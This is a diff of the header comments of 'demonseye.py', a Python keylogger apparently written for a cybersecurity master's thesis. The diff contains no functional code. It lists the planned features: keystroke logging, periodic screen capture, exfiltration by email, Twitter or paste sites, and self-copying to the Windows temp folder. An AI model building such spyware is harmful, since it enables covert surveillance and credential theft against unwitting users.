@@ -1,24 +1,31 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 #
-#   demonseye.py
+#-----------------------------------------------------------------------------------------------------------
+# Name:        demonseye.py
+# Purpose:     ES - Desarrollo de un keylogger para el TFM del Master en Ciberseguridad de La Salle 2019
+#              EN - Development of a keylogger for the TFM of the Master in Cybersecurity of La Salle 2019
 #
-#   Desarrollo de un keylogger para el TFM del Master en Ciberseguridad de La Salle 2019
+# Author:      Gabriel Marti
+# Contact:     gabimarti at gmail dot com
+# Created:     19/05/2019
+# Copyright:   (c) Gabriel Marti Fuentes 2019
+# License:     GPL
 #
-#   Autor ..........:   Gabriel Marti Fuentes,  gabimarti@gmail.com
-#   Fecha inicio ...:   19/05/2019
+# Features:    * Record keystrokes
+#              * Periodic screen capture
+#              * Send data to a remote computer with Monitor App (to do)
+#              * Send data to an email account (to do)
+#              * Send data to a Twitter account (to do)
+#              * Paste data to a Paste service/site (to do)
 #
-#   Caracteristicas :   Envio por Correo
-#                       Posteo en Twitter
-#                       Paste en PasteBin
+# Required:    Install with "pip install module-name-required"
+#              pywin32, pyWinhook, win32gui, requests, vxPython
 #
-#   Módulos / Estensiones necesarios:
-#       pip install pywin32
-#       pip install pyWinhook
-#       pip install win32gui
-#       pip install pastebin --- no verificado aún 
-#       pip install requests
-#       pip install wxPython
+# Updates:
+#
+#-----------------------------------------------------------------------------------------------------------
+#
 #
 #   to do
 #           - auto clone app / copy to windows tmp
